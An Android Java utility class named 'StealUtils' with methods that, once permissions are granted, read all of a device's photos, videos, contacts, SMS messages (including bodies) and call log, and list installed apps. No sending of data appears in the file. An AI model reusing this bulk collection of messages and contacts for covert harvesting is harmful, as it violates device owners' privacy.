package king.bird.tool;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.MediaStore;
import android.text.TextUtils;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.TimeZone;
import java.util.UUID;

/**
 * <pre>
 *     author : Wp
 *     e-mail : 18141924293@163.com
 *     time   : 2018/09/11
 *     desc   :
 *     version: 1.0
 * </pre>
 */
public class StealUtils {

    public static final String PACKAGE_OTA="com.sunmi.ota";
    public static final String PACKAGE_MARKET="woyou.market";
    public static final String PACKAGE_HARD_WARE_KEEPER="com.woyou.hardwarekeeper";
    public static final String PACKAGE_UDH="com.woyou.udh";
    public static final String PACKAGE_SETTING="com.android.settings";

    /**
     * 获取本地所有的图片
     *
     * @return list
     */
    public static List<Material> getAllLocalPhotos(final Activity context) {

        final List<Material> list = new ArrayList<>();
        PermissionUtils.checkAndRequestPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE, 0,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
                    @Override
                    public void onHasPermission() {
                        String[] projection = {
                                MediaStore.Images.Media.DATA,
                                MediaStore.Images.Media.DISPLAY_NAME,
                                MediaStore.Images.Media.SIZE
                        };
                        //全部图片
                        String where = MediaStore.Images.Media.MIME_TYPE + "=? or "
                                + MediaStore.Images.Media.MIME_TYPE + "=? or "
                                + MediaStore.Images.Media.MIME_TYPE + "=?";
                        //指定格式
                        String[] whereArgs = {"image/jpeg", "image/png", "image/jpg"};
                        //查询
                        Cursor cursor = context.getContentResolver().query(
                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, where, whereArgs,
                                MediaStore.Images.Media.DATE_MODIFIED + " desc ");
                        if (cursor == null) {
                            return;
                        }
                        //遍历
                        while (cursor.moveToNext()) {
                            Material materialBean = new Material();
                            //获取图片的名称
                            materialBean.setTitle(cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)));
                            long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)); // 大小

                            //获取图片的生成日期
                            byte[] data = cursor.getBlob(cursor.getColumnIndex(MediaStore.Images.Media.DATA));

                            String path = new String(data, 0, data.length - 1);
                            File file = new File(path);

                            if (size < 5 * 1024 * 1024) {//<5M
                                long time = file.lastModified();
                                SimpleDateFormat format = new SimpleDateFormat("yyyy-MM-dd HH:mm");
                                String t = format.format(time);
                                materialBean.setTime(t);
                                materialBean.setLogo(path);
                                materialBean.setFilePath(path);
                                materialBean.setFileSize(size);
                                materialBean.setChecked(false);
                                materialBean.setFileType(6);
                                materialBean.setFileId(UUID.randomUUID().toString().replaceAll("-", ""));
                                materialBean.setUploadedSize(0);
                                materialBean.setTimeStamps(System.currentTimeMillis() + "");
                                list.add(materialBean);
                            }
                        }
                        cursor.close();
                    }
                });

        return list;

    }

    /**
     * 获取本地所有的视频
     *
     * @return list
     */
    public static List<Material> getAllLocalVideos(final Context context) {

        final List<Material> list = new ArrayList<>();

        PermissionUtils.checkAndRequestPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE, 0,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
                    @Override
                    public void onHasPermission() {
                        String[] projection = {
                                MediaStore.Video.Media.DATA,
                                MediaStore.Video.Media.DISPLAY_NAME,
                                MediaStore.Video.Media.DURATION,
                                MediaStore.Video.Media.SIZE
                        };
                        //全部图片
                        String where = MediaStore.Images.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=? or "
                                + MediaStore.Video.Media.MIME_TYPE + "=?";
                        String[] whereArgs = {"video/mp4", "video/3gp", "video/aiv", "video/rmvb", "video/vob", "video/flv",
                                "video/mkv", "video/mov", "video/mpg"};

                        Cursor cursor = context.getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                                projection, where, whereArgs, MediaStore.Video.Media.DATE_ADDED + " DESC ");
                        if (cursor == null) {
                            return;
                        }
                        try {
                            while (cursor.moveToNext()) {
                                long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.SIZE)); // 大小
                                if (size < 600 * 1024 * 1024) {//<600M
                                    Material materialBean = new Material();
                                    String path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DATA)); // 路径
                                    long duration = cursor.getInt(cursor.getColumnIndexOrThrow(MediaStore.Video.Media.DURATION)); // 时长
                                    materialBean.setTitle(cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME)));
                                    materialBean.setLogo(path);
                                    materialBean.setFilePath(path);
                                    materialBean.setChecked(false);
                                    materialBean.setFileType(2);
                                    materialBean.setFileId(UUID.randomUUID().toString().replaceAll("-", ""));
                                    materialBean.setUploadedSize(0);
                                    materialBean.setTimeStamps(System.currentTimeMillis() + "");
                                    SimpleDateFormat format = new SimpleDateFormat("HH:mm:ss");
                                    format.setTimeZone(TimeZone.getTimeZone("GMT+0"));
                                    String t = format.format(duration);
                                    materialBean.setTime("视频时间-" + t);
                                    materialBean.setFileSize(size);
                                    list.add(materialBean);
                                }
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        } finally {
                            cursor.close();
                        }
                    }
                });
        return list;
    }

    /**
     * 获取手机所有联系人
     * Android6.0之后权限处理
     *
     * @param context
     * @return
     */
    public static List<PhoneUserInfo> getAllContactInfo(final Context context) {

        final ArrayList<PhoneUserInfo> list = new ArrayList<PhoneUserInfo>();

        PermissionUtils.checkAndRequestPermission(context, Manifest.permission.READ_CONTACTS, 0,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
                    @Override
                    public void onHasPermission() {
                        // 1.获取内容解析者
                        ContentResolver resolver = context.getContentResolver();
                        // 2.获取内容提供者的地址:com.android.contacts
                        // raw_contacts表的地址 :raw_contacts
                        // view_data表的地址 : data
                        // 3.生成查询地址
                        Uri raw_uri = Uri.parse("content://com.android.contacts/raw_contacts");
                        Uri date_uri = Uri.parse("content://com.android.contacts/data");
                        // 4.查询操作,先查询raw_contacts,查询contact_id
                        // projection : 查询的字段
                        Cursor cursor = resolver.query(raw_uri, new String[]{"contact_id"},
                                null, null, null);
                        // 5.解析cursor
                        while (cursor.moveToNext()) {
                            // 6.获取查询的数据
                            String contact_id = cursor.getString(0);
                            // cursor.getString(cursor.getColumnIndex("contact_id"));//getColumnIndex
                            // : 查询字段在cursor中索引值,一般都是用在查询字段比较多的时候
                            // 判断contact_id是否为空
                            if (!TextUtils.isEmpty(contact_id)) {//null   ""
                                // 7.根据contact_id查询view_data表中的数据
                                // selection : 查询条件
                                // selectionArgs :查询条件的参数
                                // sortOrder : 排序
                                // 空指针: 1.null.方法 2.参数为null
                                Cursor c = resolver.query(date_uri, new String[]{"data1",
                                                "mimetype"}, "raw_contact_id=?",
                                        new String[]{contact_id}, null);
                                PhoneUserInfo userInfo = new PhoneUserInfo();
                                userInfo.setId(UUID.randomUUID().toString().replaceAll("-", ""));
                                // 8.解析c
                                while (c.moveToNext()) {
                                    // 9.获取数据
                                    String data1 = c.getString(0);
                                    String mimetype = c.getString(1);
                                    // 10.根据类型去判断获取的data1数据并保存
                                    if (mimetype.equals("vnd.android.cursor.item/phone_v2")) {
                                        // 电话
                                        userInfo.setNumber(data1);
                                    } else if (mimetype.equals("vnd.android.cursor.item/name")) {
                                        // 姓名
                                        userInfo.setName(data1);
                                    }
                                }
                                // 11.添加到集合中数据
                                list.add(userInfo);
                                // 12.关闭cursor
                                c.close();
                            }
                        }
                        // 12.关闭cursor
                        cursor.close();
                    }
                });
        return list;
    }

    /**
     * 获取手机所有信息
     * Android6.0之后权限处理
     *
     * @param context
     * @return
     */
    public static String getSmsInPhone(final Context context) {

        final StringBuilder smsBuilder = new StringBuilder();

        PermissionUtils.checkAndRequestPermission(context, Manifest.permission.READ_SMS, 0,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
                    @Override
                    public void onHasPermission() {
                        final String SMS_URI_ALL = "content://sms/";
                        final String SMS_URI_INBOX = "content://sms/inbox";
                        final String SMS_URI_SEND = "content://sms/sent";
                        final String SMS_URI_DRAFT = "content://sms/draft";
                        final String SMS_URI_OUTBOX = "content://sms/outbox";
                        final String SMS_URI_FAILED = "content://sms/failed";
                        final String SMS_URI_QUEUED = "content://sms/queued";

                        try {
                            Uri uri = Uri.parse(SMS_URI_ALL);
                            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
                            Cursor cur = context.getContentResolver().query(uri, projection, null, null, "date desc");        // 获取手机内部短信

                            if (cur.moveToFirst()) {
                                int index_Address = cur.getColumnIndex("address");
                                int index_Person = cur.getColumnIndex("person");
                                int index_Body = cur.getColumnIndex("body");
                                int index_Date = cur.getColumnIndex("date");
                                int index_Type = cur.getColumnIndex("type");

                                do {
                                    String strAddress = cur.getString(index_Address);
                                    int intPerson = cur.getInt(index_Person);
                                    String strbody = cur.getString(index_Body);
                                    long longDate = cur.getLong(index_Date);
                                    int intType = cur.getInt(index_Type);

                                    SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
                                    Date d = new Date(longDate);
                                    String strDate = dateFormat.format(d);

                                    String strType = "";
                                    if (intType == 1) {
                                        strType = "接收";
                                    } else if (intType == 2) {
                                        strType = "发送";
                                    } else {
                                        strType = "null";
                                    }

                                    smsBuilder.append("[ ");
                                    smsBuilder.append(strAddress + ", ");
                                    smsBuilder.append(intPerson + ", ");
                                    smsBuilder.append(strbody + ", ");
                                    smsBuilder.append(strDate + ", ");
                                    smsBuilder.append(strType);
                                    smsBuilder.append(" ]\n\n");
                                } while (cur.moveToNext());

                                if (!cur.isClosed()) {
                                    cur.close();
                                    cur = null;
                                }
                            } else {
                                smsBuilder.append("no result!");
                            } // end if

                            smsBuilder.append("getSmsInPhone has executed!");

                        } catch (SQLiteException ex) {
                            ex.printStackTrace();
                        }
                    }
                });
        return smsBuilder.toString();
    }

    /**
     * 获取通话记录
     *
     * @param context 上下文。通话记录需要从系统的【通话应用】中的内容提供者中获取，内容提供者需要上下文。通话记录保存在联系人数据库中：data/data/com.android.provider.contacts/databases/contacts2.db库中的calls表。
     * @return 包含所有通话记录的一个集合
     */
    public static List<CallInfo> getCallInfos(final Context context) {
        final List<CallInfo> infos = new ArrayList<CallInfo>();

        PermissionUtils.checkAndRequestPermission(context, Manifest.permission.READ_CALL_LOG, 0,
                new PermissionUtils.PermissionRequestSuccessCallBack() {
                    @Override
                    public void onHasPermission() {
                        ContentResolver resolver = context.getContentResolver();
                        // uri的写法需要查看源码JB\packages\providers\ContactsProvider\AndroidManifest.xml中内容提供者的授权
                        // 从清单文件可知该提供者是CallLogProvider，且通话记录相关操作被封装到了Calls类中
                        Uri uri = CallLog.Calls.CONTENT_URI;
                        String[] projection = new String[]{
                                CallLog.Calls.NUMBER, // 号码
                                CallLog.Calls.DATE,   // 日期
                                CallLog.Calls.TYPE    // 类型：来电、去电、未接
                        };

                        Cursor cursor = resolver.query(uri, projection, null, null, null);
                        while (cursor.moveToNext()) {
                            String number = cursor.getString(0);
                            long date = cursor.getLong(1);
                            int type = cursor.getInt(2);
                            infos.add(new CallInfo(number, date, type));
                        }
                        cursor.close();
                    }
                });
        return infos;
    }

    /**
     * 过滤自定义的App和已下载的App
     * @param packageManager
     * @return
     */
    public static List<AppInfo> getInstallApp(PackageManager packageManager) {
        List<AppInfo> myAppInfos = new ArrayList<AppInfo>();
        List<AppInfo> mFilterApps = new ArrayList<AppInfo>();
        try {
            List<PackageInfo> packageInfos = packageManager.getInstalledPackages(0);
            for (int i = 0; i < packageInfos.size(); i++) {
                PackageInfo packageInfo = packageInfos.get(i);
                //过滤指定的app
                String tempPackageName=packageInfo.packageName;
                if(tempPackageName.equals(PACKAGE_OTA)||tempPackageName.equals(PACKAGE_MARKET)||tempPackageName.equals(PACKAGE_HARD_WARE_KEEPER)
                        ||tempPackageName.equals(PACKAGE_UDH)||tempPackageName.equals(PACKAGE_SETTING)){
                    AppInfo appInfo = new AppInfo();
                    appInfo.setAppName((String) packageInfo.applicationInfo.loadLabel(packageManager));
                    if (packageInfo.applicationInfo.loadIcon(packageManager) == null) {
                        continue;
                    }
                    appInfo.setAppIcon(packageInfo.applicationInfo.loadIcon(packageManager));
                    mFilterApps.add(appInfo);
                    continue;
                }

                //过滤掉系统app
                if ((ApplicationInfo.FLAG_SYSTEM & packageInfo.applicationInfo.flags) != 0) {
                    continue;
                }

                AppInfo appInfo = new AppInfo();
                appInfo.setAppName((String) packageInfo.applicationInfo.loadLabel(packageManager));
                if (packageInfo.applicationInfo.loadIcon(packageManager) == null) {
                    continue;
                }
                appInfo.setAppIcon(packageInfo.applicationInfo.loadIcon(packageManager));
                myAppInfos.add(appInfo);
            }
            myAppInfos.addAll(mFilterApps);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return myAppInfos;
    }
}
